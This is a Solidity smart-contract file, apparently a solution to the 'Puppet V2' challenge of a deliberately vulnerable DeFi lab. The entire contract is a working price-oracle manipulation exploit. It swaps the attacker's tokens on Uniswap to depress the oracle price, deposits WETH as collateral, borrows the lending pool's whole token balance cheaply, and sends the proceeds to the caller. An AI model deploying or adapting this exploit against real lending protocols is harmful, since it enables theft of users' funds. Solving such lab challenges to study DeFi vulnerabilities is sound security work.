// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 
import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title PuppetV2Attacker
 * @author Elena (Ellena.xyz@proton.me)
 */

interface IWeth is IERC20 {
    function deposit() external payable;
}

interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external payable;
    function calculateDepositOfWETHRequired(uint256 amount) external view returns (uint256);

}

interface IUniswapRouter {

     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PuppetV2Attacker {
    using SafeMath for uint;
    using Address for address;

    IUniswapRouter uniswapRouter;

    IPuppetV2Pool pool;

    IERC20  token;

    IWeth weth;

    constructor (address _pool, address _uniswapRouter, address _token,address _weth) {

         pool =IPuppetV2Pool(_pool);

        uniswapRouter = IUniswapRouter (_uniswapRouter);

        token = IERC20 (_token);

        weth = IWeth(_weth);
    }

    function attack() public payable {

        uint tokenToWethAmount = token.balanceOf(address(this));

        address[] memory tokenToWethPath = getPath(address(token), address(weth)); 

        token.approve(address(uniswapRouter), type(uint256).max);

        uniswapExchange(tokenToWethAmount, tokenToWethPath);

         //wrap weth and approve for collateral
        weth.deposit{value: address(this).balance}();

        weth.approve(address(pool), type(uint256).max);

        uint puppetPoolBalance = token.balanceOf(address(pool));

        uint wethAmountRequired = pool.calculateDepositOfWETHRequired(puppetPoolBalance);

        // atacker contract already had 20 weth and 10000 dvtoken which was swaped to weth by uniswap
        uint attackerWethBalance = weth.balanceOf(address(this));

        require(attackerWethBalance >= wethAmountRequired, "atacker 's eth balance is not enough" );

        pool.borrow (puppetPoolBalance);

        // //exchange leftover weth for tokens
        // address[] memory wethToTokenPath = getPath(address(weth), address(token)); 

        // weth.approve(address(uniswapRouter), type(uint256).max);

        // uint wethToTokenAmount = weth.balanceOf(address(this));

        // uniswapExchange(wethToTokenAmount, wethToTokenPath);

        //transfer all the token and eth we gained from the pool to attackerEOA 
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "transfer token to attackerEOA failed");
    }

    function getPath (address tokenA, address tokenB) private pure returns (address[] memory){
        address[] memory path = new address [] (2); 
        path[0] = tokenA;
        path[1] = tokenB;
        return path;
    }

    function uniswapExchange(uint tokenAmount,address[] memory path) private {
        uniswapRouter.
        swapExactTokensForTokensSupportingFeeOnTransferTokens 
        (tokenAmount, 1, path, address(this), block.timestamp + 500 seconds);
    }

    // to receive ETH from uniswap
    receive() external payable {}

}
